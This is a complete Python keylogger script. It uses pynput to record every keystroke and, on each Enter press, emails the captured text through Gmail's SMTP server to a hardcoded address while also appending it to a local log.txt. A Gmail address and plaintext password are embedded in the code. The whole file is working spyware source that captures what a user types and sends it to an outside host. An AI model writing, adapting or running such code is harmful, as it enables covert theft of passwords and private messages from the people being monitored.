from pynput import keyboard
import smtplib

text = ''
file = open('log.txt', 'a')
user = 'aniket.honeypot@gmail.com'
password = 'honeypot123'


def email(recipient, message):
    global user, password
    print('Sending email to ' + recipient + '...')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(user, password)
    server.sendmail(user, recipient, message)
    server.quit()


def keylog(key):
    global text
    if key == keyboard.Key.esc:
        exit()

    if key == keyboard.Key.backspace:
        text = text[:-1]
        return

    if key == keyboard.Key.space:
        text += ' '
        return

    if key == keyboard.Key.enter:
        email('aniket.honeypot@gmail.com', text)
        file.write(text + "\n")
        file.flush()
        text = ''
        return

    text += str(key)[1:2]


with keyboard.Listener(on_press=keylog) as listener:
    listener.join()